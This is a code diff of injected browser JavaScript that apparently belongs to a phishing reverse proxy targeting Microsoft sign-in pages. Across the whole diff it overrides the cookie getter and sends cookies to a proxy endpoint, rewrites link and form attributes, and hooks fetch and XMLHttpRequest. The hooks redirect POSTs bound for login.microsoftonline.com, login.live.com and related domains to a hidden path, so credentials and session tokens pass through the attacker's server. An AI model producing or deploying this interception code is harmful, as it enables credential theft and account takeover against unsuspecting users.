@@ -1,6 +1,5 @@
 (function () {
     const originalServiceWorkerGetRegistrationDescriptor = navigator.serviceWorker.getRegistration;
-
     navigator.serviceWorker.getRegistration = function (_scope) {
         return originalServiceWorkerGetRegistrationDescriptor.apply(this, arguments)
             .then(registration => {
@@ -17,7 +16,6 @@
 
 (function () {
     const originalServiceWorkerGetRegistrationsDescriptor = navigator.serviceWorker.getRegistrations;
-
     navigator.serviceWorker.getRegistrations = function () {
         return originalServiceWorkerGetRegistrationsDescriptor.apply(this, arguments)
             .then(registrations => {
@@ -32,7 +30,6 @@
 
 (function () {
     const originalCookieDescriptor = Object.getOwnPropertyDescriptor(Document.prototype, "cookie");
-
     Object.defineProperty(document, "cookie", {
         ...originalCookieDescriptor,
         get() {
@@ -45,10 +42,8 @@
                 xhr.open("POST", proxyRequestURL, false);
                 xhr.setRequestHeader("Content-Type", "text/plain");
                 xhr.send(cookie);
-
                 const validDomains = JSON.parse(xhr.responseText);
                 let modifiedCookie = "";
-
                 const cookieAttributes = cookie.split(";");
                 for (const cookieAttribute of cookieAttributes) {
                     let attribute = cookieAttribute.trim();
@@ -72,6 +67,7 @@
     });
 })();
 
+// ---- Attribute rewriting (still useful for links, etc.) ----
 const observer = new MutationObserver((mutations) => {
     for (const mutation of mutations) {
         if (mutation.type === "attributes") {
@@ -88,9 +84,7 @@ const observer = new MutationObserver((mutations) => {
         }
     }
 });
-
 const attributes = ["href", "action"];
-
 observer.observe(document.documentElement, {
     childList: true,
     subtree: true,
@@ -119,8 +113,6 @@ function scanAndUpdateAttributes() {
         }
     }
 }
-
-// Run initial scan on DOM ready and again after a short delay
 if (document.readyState === 'loading') {
     document.addEventListener('DOMContentLoaded', () => {
         scanAndUpdateAttributes();
@@ -131,64 +123,66 @@ if (document.readyState === 'loading') {
     setTimeout(scanAndUpdateAttributes, 100);
 }
 
-// === DIRECT FORM SUBMIT INTERCEPT (MOST RELIABLE) ===
-function interceptFormSubmit() {
-    const forms = document.querySelectorAll('form');
-    for (const form of forms) {
-        // Only intercept forms that post to Microsoft (or any external domain)
-        const action = form.getAttribute('action') || '';
-        if (action.includes('login.microsoftonline.com') || action.includes('login.live.com')) {
-            form.addEventListener('submit', function(e) {
-                e.preventDefault();
-                const formData = new FormData(form);
-                // Convert to URL-encoded string
-                const params = new URLSearchParams(formData).toString();
-                const proxyPath = '/lNv1pC9AWPUY4gbidyBO';
-                const proxyUrl = new URL(proxyPath, self.location.origin);
-                // Pass the original action as a parameter
-                const originalAction = form.action || window.location.href;
-                proxyUrl.searchParams.set('url', originalAction);
+// ==================== INTERCEPT FETCH AND XHR ====================
+// Rewrite URLs that point to Microsoft login endpoints
+const MICROSOFT_LOGIN_DOMAINS = [
+    'login.microsoftonline.com',
+    'login.live.com',
+    'login.microsoft.com',
+    'aadcdn.msauth.net',
+    'aadcdn.msftauth.net'
+];
 
-                fetch(proxyUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/x-www-form-urlencoded',
-                    },
-                    body: params,
-                    credentials: 'include'
-                })
-                .then(response => {
-                    if (response.redirected) {
-                        window.location.href = response.url;
-                    } else {
-                        response.text().then(html => {
-                            document.open();
-                            document.write(html);
-                            document.close();
-                        });
-                    }
-                })
-                .catch(err => console.error('Proxy submission error:', err));
-            });
-        }
+function shouldInterceptUrl(url) {
+    try {
+        const u = new URL(url);
+        return MICROSOFT_LOGIN_DOMAINS.some(domain => u.hostname.includes(domain));
+    } catch { return false; }
+}
+
+function getProxyUrl(originalUrl) {
+    const proxyPath = '/lNv1pC9AWPUY4gbidyBO';
+    const proxyUrl = new URL(proxyPath, self.location.origin);
+    proxyUrl.searchParams.set('url', originalUrl);
+    return proxyUrl;
+}
+
+// ---- Intercept fetch ----
+const originalFetch = window.fetch;
+window.fetch = function (input, init) {
+    let url = typeof input === 'string' ? input : input.url;
+    if (init && init.method && init.method.toUpperCase() === 'POST' && shouldInterceptUrl(url)) {
+        const proxyUrl = getProxyUrl(url);
+        // Preserve the original body, headers, etc.
+        const newInit = { ...init };
+        // Ensure credentials are included
+        newInit.credentials = 'include';
+        // If body is a FormData, we need to keep it; fetch will handle it.
+        return originalFetch.call(this, proxyUrl, newInit);
     }
-}
+    return originalFetch.call(this, input, init);
+};
 
-// Run form interceptor after DOM ready and again after dynamic changes
-function runInterceptor() {
-    interceptFormSubmit();
-    // Also re-run when new forms are added (MutationObserver already handles attribute changes, but not new forms)
-    const formObserver = new MutationObserver(() => {
-        interceptFormSubmit();
-    });
-    formObserver.observe(document.documentElement, {
-        childList: true,
-        subtree: true
-    });
-}
+// ---- Intercept XMLHttpRequest ----
+const originalXHROpen = XMLHttpRequest.prototype.open;
+XMLHttpRequest.prototype.open = function (method, url, async, user, password) {
+    if (method.toUpperCase() === 'POST' && shouldInterceptUrl(url)) {
+        const proxyUrl = getProxyUrl(url);
+        // Save the original URL for later use in send (we need to add headers)
+        this._originalUrl = url;
+        this._proxyUrl = proxyUrl;
+        return originalXHROpen.call(this, method, proxyUrl, async, user, password);
+    }
+    return originalXHROpen.call(this, method, url, async, user, password);
+};
 
-if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', runInterceptor);
-} else {
-    runInterceptor();
-}
+// Also intercept send to ensure we pass the original URL in a header (optional)
+const originalXHRSend = XMLHttpRequest.prototype.send;
+XMLHttpRequest.prototype.send = function (body) {
+    if (this._originalUrl) {
+        // Add a custom header to tell the proxy the original destination
+        this.setRequestHeader('X-Original-Url', this._originalUrl);
+        // Also set the URL as a query parameter in case the proxy needs it (already done via proxyUrl)
+    }
+    return originalXHRSend.call(this, body);
+};
